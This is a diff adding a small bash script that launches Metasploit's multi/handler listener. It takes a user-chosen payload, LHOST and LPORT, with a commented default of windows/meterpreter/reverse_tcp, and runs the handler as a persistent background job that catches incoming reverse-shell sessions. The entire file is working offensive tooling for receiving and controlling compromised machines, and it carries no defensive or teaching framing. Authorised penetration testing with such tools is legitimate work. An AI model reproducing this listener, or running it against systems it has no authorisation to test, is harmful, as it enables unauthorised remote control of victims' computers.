@@ -1,0 +1,15 @@
+#!/bin/bash
+MSF_PATH="/opt/metasploit/app/"
+MSFCLI=$MSF_PATH"msfconsole";
+#INTERFACE="eth0";
+#LPORT="8080";
+#PAYLOAD="windows/meterpreter/reverse_tcp";
+read -p "Enter your Payload: " payload
+read -p "Enter your LHOST: " lhost
+read -p "Enter your LPORT: " lport
+echo "!!!Starting Metasploit multi/handler!!!";
+#LHOST=`ifconfig $INTERFACE | grep "inet addr" | cut -d":" -f2 | cut -d" " -f1`;
+echo "PAYLOAD=$payload";
+echo "LHOST=$lhost";
+echo "LPORT=$lport";
+$MSFCLI -x "use exploit/multi/handler; set PAYLOAD $payload; set LHOST $lhost; set LPORT $lport; set ExitOnSession false; exploit -j; run"
